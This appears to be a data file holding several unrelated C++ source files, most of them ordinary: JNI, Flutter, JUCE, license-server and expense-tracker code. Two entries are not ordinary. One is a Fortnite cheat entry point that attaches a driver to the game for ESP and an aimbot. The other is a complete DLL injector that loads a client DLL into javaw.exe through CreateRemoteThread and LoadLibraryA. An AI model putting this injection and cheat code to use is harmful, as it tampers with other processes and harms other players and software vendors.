    "#include <jni.h>\n#include <string>\n#include \"Person.h\"\n#include <android/log.h>\n\n\n/*\n * C++ File\n *      \u2705 1. Send Int\n *      \u2705 2. Send String\n *      \u2705 3. Send Float\n *      \u2705 4. Send Char\n *      \u2705 5. Send Array\n *      \u2705 6. Send Object\n *\n * */\n\n\nextern \"C\" JNIEXPORT jstring Java_com_programming_cmaketest_MainActivity_getString(JNIEnv* env,jobject /* this */) {\n    std::string urls = \"https://breakingbadapi.com/documentation\";\n    return env->NewStringUTF(urls.c_str());\n}\n\nextern \"C\" JNIEXPORT jint Java_com_programming_cmaketest_MainActivity_getInt(JNIEnv* env, jobject) {\n    int num = 100;\n    return static_cast<jint>(num);\n}\n\nextern \"C\" JNIEXPORT jfloat Java_com_programming_cmaketest_MainActivity_getFloat(JNIEnv* env, jobject) {\n    int num = (float)3.145;\n    return static_cast<jfloat>(num);\n}\n\nextern \"C\" JNIEXPORT jchar Java_com_programming_cmaketest_MainActivity_getChar(JNIEnv* env, jobject) {\n    int num = 'A';\n    return static_cast<jchar>(num);\n}\n\nextern \"C\" JNIEXPORT jintArray Java_com_programming_cmaketest_MainActivity_getList(JNIEnv* env, jobject) {\n    jintArray result = env->NewIntArray(5);\n    jint fill[5] = {1, 2, 3, 4, 5};\n    env->SetIntArrayRegion(result, 0, 5, fill);\n    return result;\n}\n\nextern \"C\" JNIEXPORT jstring JNICALL Java_com_programming_cmaketest_MainActivity_getPersonInfo(JNIEnv* env, jobject /* this */) {\n\n    Person person(22, env->NewStringUTF(\"John Doe\"));\n    jstring info = person.getStr(env);\n\n    return info;\n}\n\nextern \"C\" JNIEXPORT jobject JNICALL Java_com_programming_cmaketest_MainActivity_getPerson(JNIEnv* env, jobject /* this */, jint age, jstring name) {\n\n    jclass personClass = env->FindClass(\"app/cpp/Person\");\n    jmethodID constructor = env->GetMethodID(personClass, \"<init>\", \"(ILjava/lang/String;)V\");\n\n    const char* nativeName = env->GetStringUTFChars(name, JNI_FALSE);\n    jstring javaName = env->NewStringUTF(nativeName);\n    env->ReleaseStringUTFChars(name, nativeName);\n\n    jobject personObject = env->NewObject(personClass, constructor, age, javaName);\n\n    return personObject;\n}\n\n",
    "//Copyright (c) 1998 - 1999 Microsoft Corporation\r\n/*++\r\n\r\n\r\n  \r\nModule Name:\r\n\r\n    LsServer.cpp\r\n\r\nAbstract:\r\n    \r\n    This Module contains the implementation of CKeyPack, CLicense,\r\n    CLicServer, CAllServers classes\r\n\r\nAuthor:\r\n\r\n    Arathi Kundapur (v-akunda) 11-Feb-1998\r\n\r\nRevision History:\r\n\r\n--*/\r\n\r\n#include <stdafx.h>\r\n#include \"resource.h\"\r\n#include \"defines.h\"\r\n#include \"LSServer.h\"\r\n\r\n///////////////////////////////////////////////////////////\r\nint GetStatusPosition( CLicense *pLic );\r\n\r\n\r\nCKeyPack::CKeyPack(\r\n    LSKeyPack &KeyPack\r\n    )\r\n/*++\r\n\r\n\r\n--*/\r\n{\r\n    m_hTreeItem = NULL;\r\n    m_bIsExpanded = FALSE;\r\n    m_pLicServer = NULL;\r\n    m_KeyPack = KeyPack;\r\n    return;\r\n}\r\n\r\n//---------------------------------------------------------\r\nCKeyPack::~CKeyPack()\r\n{\r\n    PurgeCache();\r\n}\r\n\r\n//---------------------------------------------------------\r\nvoid \r\nCKeyPack::AddIssuedLicense(\r\n    CLicense * pIssuedLicense\r\n    )\r\n/*++\r\n\r\n--*/\r\n{\r\n    if(NULL == pIssuedLicense)\r\n    {\r\n        return;\r\n    }\r\n\r\n    CString MachineName = pIssuedLicense->GetLicenseStruct().szMachineName;\r\n    if(MachineName.IsEmpty())\r\n    {\r\n        MachineName.LoadString(IDS_UNKNOWN);\r\n        lstrcpy(pIssuedLicense->GetLicenseStruct().szMachineName,(LPCTSTR)MachineName);\r\n    }\r\n\r\n    pIssuedLicense->SetKeyPack(this);\r\n    m_IssuedLicenseList.AddTail(pIssuedLicense);\r\n\r\n    return;\r\n}\r\n\r\n//---------------------------------------------------------\r\nvoid\r\nCKeyPack::PurgeCache()\r\n{\r\n    CLicense *pLicense = NULL;\r\n\r\n    POSITION pos = m_IssuedLicenseList.GetHeadPosition();\r\n    while(pos)\r\n    {\r\n        pLicense = (CLicense *)m_IssuedLicenseList.GetNext(pos);\r\n        ASSERT(pLicense);\r\n        if(pLicense)\r\n        {\r\n            delete pLicense;\r\n            pLicense = NULL;\r\n        }\r\n    }\r\n\r\n    m_IssuedLicenseList.RemoveAll();\r\n\r\n    m_bIsExpanded = FALSE;\r\n}\r\n\r\n//---------------------------------------------------------\r\nHRESULT\r\nCKeyPack::RefreshIssuedLicenses(\r\n    LSLicense* pLicenses, /* = NULL */\r\n    DWORD dwFreshParm,  /* = 0 */\r\n    BOOL bMatchAll /* = FALSE */\r\n    )\r\n/*++\r\n\r\n    None of the parameter is supported yet.\r\n\r\n--*/\r\n{\r\n    PCONTEXT_HANDLE hBinding = NULL;\r\n    BOOL bContext = FALSE;\r\n    DWORD status = ERROR_SUCCESS;\r\n    LSLicenseEx  sLicense;\r\n    CString Server;\r\n    CLicServer *pServer = GetServer();\r\n    HRESULT hResult = S_OK;\r\n    DWORD dwErrCode;\r\n\r\n    ASSERT(pServer);\r\n    if(NULL == pServer)\r\n    {\r\n        return E_FAIL;\r\n    }\r\n\r\n    PurgeCache();\r\n   \r\n    hBinding = pServer->GetContext();\r\n    if(NULL == hBinding)\r\n    {\r\n        if(pServer->UseIpAddress())\r\n        {\r\n            Server = pServer->GetIpAddress();\r\n        }\r\n        else\r\n        {\r\n            Server = pServer->GetName();\r\n        }\r\n\r\n        hBinding = TLSConnectToLsServer(Server.GetBuffer(Server.GetLength()));\r\n        if(hBinding == NULL)\r\n        {\r\n            hResult = CONNECTION_FAILED;\r\n            goto cleanup;\r\n        }\r\n    }\r\n\r\n    status = TLSKeyPackEnumBegin(\r\n                            hBinding,\r\n                            LSKEYPACK_EXSEARCH_DWINTERNAL,\r\n                            FALSE,\r\n                            &m_KeyPack,\r\n                            &dwErrCode\r\n                        );\r\n\r\n    if(status != RPC_S_OK  || dwErrCode != ERROR_SUCCESS)\r\n    {\r\n        hResult = status;\r\n        goto cleanup;\r\n    }\r\n\r\n    status = TLSKeyPackEnumNext(\r\n                            hBinding,\r\n                            &m_KeyPack,\r\n                            &dwErrCode\r\n                        );\r\n\r\n    TLSKeyPackEnumEnd(hBinding, &dwErrCode);\r\n\r\n    if(status != RPC_S_OK  || dwErrCode != ERROR_SUCCESS)\r\n    {\r\n        hResult = status;\r\n        goto cleanup;\r\n    }    \r\n   \r\n    memset(&sLicense, 0, sizeof(LSLicenseEx));\r\n\r\n    sLicense.dwKeyPackId = m_KeyPack.dwKeyPackId;\r\n    TLSLicenseEnumBegin( \r\n                            hBinding, \r\n                            LSLICENSE_SEARCH_KEYPACKID,\r\n                            FALSE,\r\n                            (LPLSLicenseSearchParm)&sLicense,\r\n                            &status\r\n                        );\r\n\r\n    if(status != ERROR_SUCCESS)\r\n    { \r\n        hResult = status;\r\n        goto cleanup;\r\n    }\r\n         \r\n    DWORD TLSLicenseEnumNextResult = ERROR_SUCCESS;\r\n    do {\r\n        memset(&sLicense, 0, sizeof(LSLicenseEx));\r\n        TLSLicenseEnumNextResult = TLSLicenseEnumNextEx(hBinding, &sLicense, &status);\r\n\r\n        if ((status == ERROR_SUCCESS) && (TLSLicenseEnumNextResult == RPC_S_OK))\r\n        {    \r\n            CLicense * pLicense = new CLicense(sLicense);\r\n            if(NULL == pLicense)\r\n            {\r\n                hResult = E_OUTOFMEMORY;\r\n                goto cleanup;\r\n            }\r\n    \r\n            AddIssuedLicense(pLicense);\r\n        }\r\n    } while ((status == ERROR_SUCCESS) && (TLSLicenseEnumNextResult == RPC_S_OK));\r\n\r\n    TLSLicenseEnumEnd(hBinding, &status);\r\n    \r\n    m_bIsExpanded = TRUE;\r\n\r\ncleanup:\r\n\r\n    ",
    "\ufeff#include \"util.hpp\"\r\n#include \"cheat/actors/esp.hpp\"\r\n#include \"cheat/actors/aimbot.hpp\"\r\n\r\nOverlay::DXOverlay* pOverlay = nullptr;\r\n\r\n\r\nint main() {\r\n\r\n\tprocess_id = find_process(\"FortniteClient-Win64-Shipping.exe\");\r\n\tDriver::AttachProcess(L\"FortniteClient-Win64-Shipping.exe\");\r\n\r\n\tuint64_t processBaseAddress = Driver::GetProcessBaseAddress();\r\n\tprintf(\"ProcessBaseAddress: 0x%llX\\n\", processBaseAddress);\r\n\tDriver::baseAddress = processBaseAddress;\r\n\tbase_address = processBaseAddress;\r\n\r\n\tuint64_t ProcessPEB = Driver::GetPebAddress();\r\n\tprintf(\"Peb address: 0x%llX\\n\", ProcessPEB);\r\n\r\n\r\n\tOverlay::DXOverlay::GetWindow(FindWindow(0, \"Fortnite  \"));\r\n\tauto InitOverlay = pOverlay->InitOverlay();\r\n\r\n\tstd::thread p(cache_actors_combined);\r\n\tp.detach();\r\n\r\n\r\n\tstd::filesystem::create_directories(\"C:\\\\evac\");\r\n\tstd::filesystem::create_directories(\"C:\\\\evac\\\\configs\");\r\n\tstd::filesystem::create_directories(\"C:\\\\evac\\\\configs\\\\fortnite\");\r\n\r\n\tconfig.refresh_configs();\r\n\tconfig.load_config(0);\r\n\tswitch (InitOverlay)\r\n\t{\r\n\tcase 0: { break; }\r\n\tcase 1:\r\n\t{\r\n\t\tconst double target_fps = 240.0;\r\n\t\t\r\n\t\tMouseController::Init();\r\n\t\twhile (pOverlay->MainLoop(actor_loop)) {\r\n\t\t\t\r\n\t\t\t\r\n\t\t}\r\n\t\tbreak;\r\n\t}\r\n\t}\r\n}",
    "#include <Windows.h>\n#include <cstdio>\n#include <cstring>\n#include <TlHelp32.h>\n\n#define INFO(format, ...) printf(\"[INFO] \" format \"\\n\", ##__VA_ARGS__)\n#define ERROR(format, ...) printf(\"[ERROR] \" format \"\\n\", ##__VA_ARGS__)\n\nDWORD GetProcessId(const char* processName)\n{\n    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);\n\n    if (hSnapshot == INVALID_HANDLE_VALUE)\n    {\n        ERROR(\"failed 2 create snapshot of processes. Error: %lu\", GetLastError());\n        return 0;\n    }\n\n    PROCESSENTRY32 pe32;\n    pe32.dwSize = sizeof(PROCESSENTRY32);\n\n    if (!Process32First(hSnapshot, &pe32))\n    {\n        ERROR(\"failed 2 get first process in snapshot. Error: %lu\", GetLastError());\n        CloseHandle(hSnapshot);\n        return 0;\n    }\n\n    do\n    {\n        if (strcmp(pe32.szExeFile, processName) == 0)\n        {\n            CloseHandle(hSnapshot);\n            return pe32.th32ProcessID;\n        }\n    } while (Process32Next(hSnapshot, &pe32));\n\n    CloseHandle(hSnapshot);\n\n    return 0;\n}\n\n\nint main()\n{\n    const char* processName = \"javaw.exe\";\n\n    // replace with your own\n    const char* dllPath = R\"(C:\\Users\\creid\\OneDrive\\Documents\\GitHub\\plaguemc\\x64\\Release\\plague-nextgen.dll)\";\n\n    const DWORD processId = GetProcessId(processName);\n\n    if (processId == 0)\n    {\n        ERROR(\"failed 2 get process id of %s\", processName);\n        return 1;\n    }\n\n    // create a handle to the process\n    // this handle is responsible for all operations on the process\n    HANDLE processHandle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, processId);\n\n    // check if the handle is valid\n    if (processHandle == nullptr)\n    {\n        ERROR(\"failed 2 open process %lu. error: %lu\", processId, GetLastError());\n        return 1;\n    }\n\n    // allocate the memory into the target process\n    // we use the length of the dll path + 1 to include the null terminator\n    // VirtualAllocEx allocates memory into a target process, hence why we aren't using malloc or new (obviously)\n    LPVOID dllPathAddress = VirtualAllocEx(processHandle, nullptr, strlen(dllPath) + 1, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);\n\n    // check if its null\n    if (dllPathAddress == nullptr)\n    {\n        ERROR(\"failed 2 allocate memory in process %lu. error: %lu\", processId, GetLastError());\n        CloseHandle(processHandle);\n        return 1;\n    }\n\n\n    if (!WriteProcessMemory(processHandle, dllPathAddress, dllPath, strlen(dllPath) + 1, nullptr))\n    {\n        ERROR(\"failed 2 write memory in process %lu. Error: %lu\", processId, GetLastError());\n\n        // cleanup\n        VirtualFreeEx(processHandle, dllPathAddress, 0, MEM_RELEASE);\n        CloseHandle(processHandle);\n        return 1;\n    }\n\n    // we cant do anything if we dont have this handle\n    // the kernel 32 handle is responsible for loading the dll into the process\n    // each windows process has a kernel32.dll loaded into it\n    HMODULE kernel32 = GetModuleHandleA(\"kernel32.dll\");\n\n    if (kernel32 == nullptr)\n    {\n        ERROR(\"failed 2 get handle to kernel32.dll. Error: %lu\", GetLastError());\n\n        // cleanup\n        VirtualFreeEx(processHandle, dllPathAddress, 0, MEM_RELEASE);\n        CloseHandle(processHandle);\n        return 1;\n    }\n\n    // get the address of LoadLibraryA\n    FARPROC LLAAddress = GetProcAddress(kernel32, \"LoadLibraryA\");\n\n    // if we cant get the address of LoadLibraryA, we cant load the dll\n    if (LLAAddress == nullptr)\n    {\n        ERROR(\"failed 2 get LLA address. Error: %lu\", GetLastError());\n        VirtualFreeEx(processHandle, dllPathAddress, 0, MEM_RELEASE);\n        CloseHandle(processHandle);\n        return 1;\n    }\n\n    // create a remote thread in the target process\n    // this thread is responsible for actually loading it\n    HANDLE remoteThreadHandle = CreateRemoteThread(processHandle, nullptr, 0, (LPTHREAD_START_ROUTINE)LLAAddress, dllPathAddress, 0, nullptr);\n\n    INFO(\"creating remote thread handle...\");\n\n    if (remoteThreadHandle == nullptr)\n    {\n        ERROR(\"failed 2 create remote thread in process %lu. error: %lu\", processId, GetLastError());\n\n        // cleanup\n\n        VirtualFreeEx(processHandle, dllPathAddress, 0, MEM_RELEASE);\n        CloseHandle(processHandle);\n        return 1;\n    }\n\n    INFO(\"Successfully created remote thread handle!\");\n\n\n    INFO(\"we are so fucking gucci it injected ;3 %s\", processName);\n\n\n    INFO(\"Waiting for the thread to finish...\");\n    WaitForSingleObject(remoteThreadHandle, INFINITE);\n\n    INFO(\"Thread finished!\");\n\n    INFO(\"Cleaning up...\");\n\n\n    VirtualFreeEx(processHandle, dllPathAddress, 0, MEM_RELEASE);\n    CloseHandle(remoteThreadHandle);\n    CloseHandle(processHandle);\n\n\n\n    return 0;\n}\n",
    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.Create(L\"ex3\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
    "#include \"BitRangeVisualizerAudioProcessor.h\"\n#include \"BitRangeVisualizerAudioProcessorEditor.h\"\n#include <cmath> // for log2 and sqrt\n\nBitRangeVisualizerAudioProcessor::BitRangeVisualizerAudioProcessor()\n{\n    addParameter(showClipDetectionParam = new juce::AudioParameterBool(\"showClipDetection\", \"Show Clip Detection\", true));\n    addParameter(showSampleRateParam = new juce::AudioParameterBool(\"showSampleRate\", \"Show Sample Rate\", true));\n}\n\nBitRangeVisualizerAudioProcessor::~BitRangeVisualizerAudioProcessor()\n{\n}\n\nvoid BitRangeVisualizerAudioProcessor::prepareToPlay(double sampleRate, int samplesPerBlock)\n{\n}\n\nvoid BitRangeVisualizerAudioProcessor::releaseResources()\n{\n}\n\nvoid BitRangeVisualizerAudioProcessor::processBlock(juce::AudioBuffer<float>& buffer, juce::MidiBuffer&)\n{\n    calculateBitDepth(buffer);\n    detectClipping(buffer);\n}\n\nvoid BitRangeVisualizerAudioProcessor::detectClipping(const juce::AudioBuffer<float>& buffer)\n{\n    sampleClipDetected = false;\n    intersampleClipDetected = false;\n\n    const int numSamples = buffer.getNumSamples();\n    const int numChannels = buffer.getNumChannels();\n\n    for (int channel = 0; channel < numChannels; ++channel)\n    {\n        const float* samples = buffer.getReadPointer(channel);\n\n        for (int i = 0; i < numSamples; ++i)\n        {\n            if (samples[i] >= 1.0f || samples[i] <= -1.0f)\n            {\n                sampleClipDetected = true;\n            }\n\n            if (i > 0)\n            {\n                float prevSample = samples[i - 1];\n                float currentSample = samples[i];\n                if (std::abs(prevSample - currentSample) > 1.0f)\n                {\n                    intersampleClipDetected = true;\n                }\n            }\n\n            if (sampleClipDetected && intersampleClipDetected)\n            {\n                return; // Early exit if both types of clipping are detected\n            }\n        }\n    }\n}\n\n//Calc BitDepth\nvoid BitRangeVisualizerAudioProcessor::calculateBitDepth(const juce::AudioBuffer<float>& buffer)\n{\n    const int numSamples = buffer.getNumSamples();\n    const int numChannels = buffer.getNumChannels();\n    bitDepthLevels.resize(numChannels * 32, 0.0f); // Resize for 32 bits\n\n    for (int channel = 0; channel < numChannels; ++channel)\n    {\n        const float* samples = buffer.getReadPointer(channel);\n\n        for (int i = 0; i < numSamples; ++i)\n        {\n            float sample = samples[i];\n\n            // Scale sample from -1.0 to 1.0 range to 0 to 1.0 range\n            sample = (sample + 1.0f) * 0.5f;\n\n            // Convert to integer representation\n            uint32_t intSample = static_cast<uint32_t>(sample * 0xFFFFFFFF);\n\n            // Loop through each bit in the sample\n            for (int bit = 0; bit < 32; ++bit)\n            {\n                if (intSample & (1 << bit))\n                {\n                    // Increment bit usage counter if the bit is set\n                    bitDepthLevels[channel * 32 + bit]++;\n                }\n            }\n        }\n    }\n\n    // Normalize the bit depth levels\n    for (int channel = 0; channel < numChannels; ++channel)\n    {\n        for (int bit = 0; bit < 32; ++bit)\n        {\n            bitDepthLevels[channel * 32 + bit] /= numSamples;\n        }\n    }\n}\n\njuce::AudioProcessor* JUCE_CALLTYPE createPluginFilter()\n{\n    return new BitRangeVisualizerAudioProcessor();\n}\n\nvoid BitRangeVisualizerAudioProcessor::getStateInformation(juce::MemoryBlock& destData)\n{\n    // Store plugin state\n    auto state = std::make_unique<juce::XmlElement>(\"State\");\n    state->setAttribute(\"showClipDetection\", (int)*showClipDetectionParam);\n    state->setAttribute(\"showSampleRate\", (int)*showSampleRateParam);\n    copyXmlToBinary(*state, destData);\n}\n\nvoid BitRangeVisualizerAudioProcessor::setStateInformation(const void* data, int sizeInBytes)\n{\n    // Restore plugin state\n    std::unique_ptr<juce::XmlElement> state(getXmlFromBinary(data, sizeInBytes));\n    if (state != nullptr)\n    {\n        if (state->hasTagName(\"State\"))\n        {\n            *showClipDetectionParam = (bool)state->getIntAttribute(\"showClipDetection\", 1);\n            *showSampleRateParam = (bool)state->getIntAttribute(\"showSampleRate\", 1);\n        }\n    }\n}\n\njuce::AudioProcessorEditor* BitRangeVisualizerAudioProcessor::createEditor()\n{\n    return new BitRangeVisualizerAudioProcessorEditor(*this);\n}\n",
    "#include <iostream> \n#include <string> \n#include<Windows.h> // to have better control of the console window for eg to change color or move to a location on the console window\n#include<conio.h> // to take key input like arrow keys \n#include<sstream> // for string to number conversion \n#include <fstream> \n#include<vector> \n#include <iomanip> \nusing namespace std;\n// Global variables \nstring fileName;\n// structures \nstruct Expense {\n\tstring user;\n\tstring category;\n\tstring description;\n\tdouble amount;\n\tstring date;\n\tstring designation; // where you are spending it on! \n};\nstruct users {\n\tstring username;\n\tstring password;\n\tint familymembers;\n\tdouble income;\n\tvector<Expense> expenses; // A vector of Expense structures \n}userInfo;\nstruct Data {\n\tdouble amount;\n\tstring category;\n\tstring description;\n\tstring date;\n\tstring designation;\n};\nvector<Data>user;\nstring months[12] = { \"Jan\", \"Feb\", \"Mar\", \"Apr\",\n\"May\", \"June\", \"July\", \"Aug\",\n\"Sept\", \"Oct\", \"Nov\", \"Dec\" };\nstring username, filename;\nstring password;\n// Function Declarations \n//Savings & Debt \ndouble saving, debt;\ndouble salary;\nvoid usersaving();\nvoid userdebt();\n// Utility Functions \nvoid color(int color);\nvoid gotoxy(int x, int y);\nbool checkUsername(const string& username);\nbool startsWithLetters(const string& str);\n// function to add expenses \nvoid addExpense(string category, string fileName);\n// function to update,delete expenses \nvoid updateExpense(string category, string fileName);\nvoid deleteExpense(const string& category, const string& fileName);\n//function to search \nvoid searchExpense(string fileName);\n//function to view expenses \nvoid viewExpenses(const string& fileName); //this is the menu to view diff category \nvoid viewCategoryExpense(const string& category, const string& fileName);\n// Welcome Screen \nint welcome(); // initial screen that user will see once the program starts \n// All menus \nbool menu1(int choose); // Login or Signup \nvoid menu2();\n// add menu \nvoid menu3(string action); //delete update menu \nbool registerUser(); // Sign UP \nbool loginUser(); // Login \nbool forgetUser(); //forget password \nvoid genReport(); //generates weekly & monthly report \n// functions used in report generation \nvoid readMonth(string filename, string dated);\nvoid readWeek(string filename, string dated);\nvoid readYear(string filename, string dated);\nvoid tokenize(string s, string del);\nbool isInt(const string& str);\nvoid splitDate(const string& date, int& year, int& month, int& day);\nvoid splitDate(const string& date, int& year, int& month);\nint getWeekOfMonth(int day);\nvoid main()\n{\n\tint action;\n\tint log = welcome(); // user selects an option i.e Login / signup \n\tif (menu1(log)) {\n\t\tint Set[9] = { 7,7,7,7,7,7,7,7,7 };\n\t\tint counter = 1;\n\t\tchar key;\n\t\tbool exit = false;\n\t\tdo\n\t\t{\n\t\t\tsystem(\"cls\");\n\t\t\tcout << \"\\t\\tPersonal Expense Tracker\\t\\n\\n\";\n\t\t\tfor (int i = 0;;) {\n\t\t\t\tgotoxy(10, 4);\n\t\t\t\tcolor(Set[0]);\n\t\t\t\tcout << \"1. Add Expense\";\n\t\t\t\tgotoxy(35, 4);\n\t\t\t\tcolor(Set[1]);\n\t\t\t\tcout << \"\\t 2. View Expense \\n\\t\";\n\t\t\t\tgotoxy(10, 6);\n\t\t\t\tcolor(Set[2]);\n\t\t\t\tcout << \"3. Update Expense \";\n\t\t\t\tgotoxy(35, 6);\n\t\t\t\tcolor(Set[3]);\n\t\t\t\tcout << \"\\t 4. Delete Expense \\n\\t\";\n\t\t\t\tgotoxy(10, 8);\n\t\t\t\tcolor(Set[4]);\n\t\t\t\tcout << \"5. Generate Monthly Report\\n\\t\";\n\t\t\t\tgotoxy(35, 8);\n\t\t\t\tcolor(Set[5]);\n\t\t\t\tcout << \"\\t 6. View Savings\\n\\t\";\n\t\t\t\tgotoxy(10, 10);\n\t\t\t\tcolor(Set[6]);\n\t\t\t\tcout << \"7. View Debts\\n\\t\";\n\t\t\t\tgotoxy(35, 10);\n\t\t\t\tcolor(Set[7]);\n\t\t\t\tcout << \"\\t 8.Search Expense\\n\";\n\t\t\t\tgotoxy(10, 12);\n\t\t\t\tcolor(Set[8]);\n\t\t\t\tcout << \"9. Exit\\n\";\n\t\t\t\tkey = _getch();\n\t\t\t\tif (key == 75 && (counter == 2 || counter == 4 || counter == 6 || counter == 8)) { // Left arrow key\n\t\t\t\t\t\tcounter--;\n\t\t\t\t}\n\t\t\t\tif (key == 77 && (counter == 1 || counter == 3 || counter == 5 || counter == 7)) { // Right arrow key\n\t\t\t\t\t\tcounter++;\n\t\t\t\t}\n\t\t\t\tif (key == 72 && (counter > 2)) { // Up arrow key \n\t\t\t\t\tcounter -= 2;\n\t\t\t\t}\n\t\t\t\tif (key == 80 && (counter < 8)) { // Down arrow key \n\t\t\t\t\tcounter += 2;\n\t\t\t\t}\n\t\t\t\tif (key == '\\r') { //enter key \n\t\t\t\t\taction = counter;\n\t\t\t\t\tcolor(7);\n\t\t\t\t\tbreak;\n\t\t\t\t}\n\t\t\t\t// by default color white \n\t\t\t\tfor (int i = 0; i < 9; i++) {\n\t\t\t\t\tSet[i] = 7;\n\t\t\t\t}\n\t\t\t\t// Set current selection to red \n\t\t\t\tif (counter >= 1 && counter <= 9) {\n\t\t\t\t\tSet[counter - 1] = 12; // Red color \n\t\t\t\t}\n\t\t\t}\n\t\t\tswitch (action)\n\t\t\t{\n\t\t\tcase 1:\n\t\t\t{\n\t\t\t\tmenu2();\n\t\t\t\tbreak; // user gets choices to choose from to add expenses \n\t\t\t}\n\t\t\tcase 2:\n\t\t\t{\n\t\t\t\tviewExpenses(fileName);\n\t\t\t\tbreak;\n\t\t\t}\n\t\t\tcase 3:\n\t\t\t{\n\t\t\t\tmenu3(\"update\");\n\t\t\t\tbreak;\n\t\t\t}\n\t\t\tcase 4:\n\t\t\t{\n\t\t\t\tmenu3(\"delete\");\n\t\t\t\tbreak;\n\t\t\t}\n\t\t\tcase 5:\n\t\t\t{\n\t\t\t\tgenReport();\n\t\t\t\tbreak;\n\t\t\t}\n\t\t\tcase 6:\n\t\t\t{\n\t\t\t\tusersaving();\n\t\t\t\tbreak;\n\t\t\t}\n\t\t\tcase 7:\n\t\t\t{\n\t\t\t\tuserdebt();\n\t\t\t\tbreak;\n\t\t\t}\n\t\t\tcase 8:\n\t\t\t{\n\t\t\t\tsearchExpense(fileName);\n\t\t\t\tbreak;\n\t\t\t}\n\t\t\tcase 9:\n\t\t\t{\n\t\t\t\texit = true;\n\t\t\t\tcout << \"Have a good day!\" << endl;\n\t\t\t\tbreak;\n\t\t\t}\n\t\t\t}\n\t\t} while (!exit);\n\t\tsystem(\"pause\");\n\t}\n}\n// function to set color \nvoid color(int color) {\n\tSetConsoleTextAttribute(GetStd",
    "#include <string.h>\n#include <time.h>\n#include <sys/time.h>\n#include <stdarg.h>\n#include \"log.h\"\n#include <pthread.h>\nusing namespace std;\n\nLog::Log() {\n    m_count = 0;\n    m_is_async = false;\n}\nLog::~Log() {\n    if (m_fp != NULL) {\n        fclose(m_fp);\n    }\n}\n//\u5f02\u6b65\u9700\u8981\u8bbe\u7f6e\u963b\u585e\u961f\u5217\u7684\u957f\u5ea6\uff0c\u540c\u6b65\u4e0d\u9700\u8981\u8bbe\u7f6e\nbool Log::init(const char *file_name, int close_log, int log_buf_size, int split_lines, int max_queue_size) {\n    //\u5982\u679c\u8bbe\u7f6e\u4e86max_queue_size,\u5219\u8bbe\u7f6e\u4e3a\u5f02\u6b65\n    if (max_queue_size >= 1) {\n        m_is_async = true;\n        m_log_queue = new block_queue<string> (max_queue_size);\n        pthread_t tid;\n        //flush_log_thread\u4e3a\u56de\u8c03\u51fd\u6570,\u8fd9\u91cc\u8868\u793a\u521b\u5efa\u7ebf\u7a0b\u5f02\u6b65\u5199\u65e5\u5fd7\n        pthread_create(&tid, NULL, flush_log_thread, NULL);\n    }\n    m_close_log = close_log;\n    m_log_buf_size = log_buf_size;\n    m_buf = new char[m_log_buf_size];\n    memset(m_buf, '\\0', m_log_buf_size);\n    m_split_lines = split_lines;\n\n    time_t t = time(NULL);\n    struct tm * sys_tm = localtime(&t);\n    struct tm my_tm = *sys_tm;\n\n    const char *p = strrchr(file_name, '/'); //\u6307\u9488\u6307\u5411\u4e86\u6700\u540e\u4e00\u4e2a/\u7684\u5b57\u7b26\n    char log_full_name[256] = {0};\n\n    if (p == NULL) {\n        snprintf(log_full_name, 255, \"%d_%02d_%02d_%s\", my_tm.tm_year + 1900, my_tm.tm_mon + 1, my_tm.tm_mday, file_name); //\u683c\u5f0f\u5316\u8f93\u51fa\u5b57\u7b26\u4e32\uff0c\u5e76\u5c06\u7ed3\u679c\u5199\u5165\u5230\u6307\u5b9a\u7684\u7f13\u51b2\u533a\n    } else {\n        strcpy(log_name, p + 1); //\u628afilename\u7ed9\u5230log\n        strncpy(dir_name, file_name, p - file_name + 1); //\u590d\u5236\u8def\u5f84\n        snprintf(log_full_name, 255, \"%s%d_%02d_%02d_%s\", dir_name, my_tm.tm_year + 1900, my_tm.tm_mon + 1, my_tm.tm_mday, log_name);\n    }\n    m_today = my_tm.tm_mday;\n    m_fp = fopen(log_full_name, \"a\"); //\u5f53mode\u662f\u201ca\u201d\u65f6\uff0c\u8868\u793a\u201c\u6253\u5f00\u6587\u4ef6\uff0c\u7528\u4e8e\u8ffd\u52a0 (\u5728\u6587\u4ef6\u5c3e\u5199)\u3002\u5982\u679c\u6587\u4ef6\u4e0d\u5b58\u5728\u5c31\u521b\u5efa\u5b83\u3002\n    if (m_fp == NULL) {\n        return false;\n    }\n    return true;\n}\n\nvoid Log::write_log(int level, const char *format, ...) {\n    struct timeval now = {0, 0};\n    gettimeofday(&now, NULL);\n    time_t t = now.tv_sec;\n    struct tm *sys_tm = localtime(&t);\n    struct tm my_tm = *sys_tm;\n    char s[16] = {0};\n    switch (level) {\n        case 0:\n            strcpy(s, \"[debug]:\");\n            break;\n        case 1:\n            strcpy(s, \"[info]:\");\n            break;\n        case 2:\n            strcpy(s, \"[warn]:\");\n            break;\n        case 3:\n            strcpy(s, \"[erro]:\");\n            break;\n        default:\n            strcpy(s, \"[info]:\");\n            break;\n    }\n    //\u5199\u5165\u4e00\u4e2alog\uff0c\u5bf9m_count++, m_split_lines\u6700\u5927\u884c\u6570\n    m_mutex.lock();\n    m_count++;\n    //\u6bcf\u5929\u65e5\u5fd7\n    if (m_today != my_tm.tm_mday || m_count % m_split_lines == 0) {       \n        char new_log[256] = {0};\n        fflush(m_fp);\n        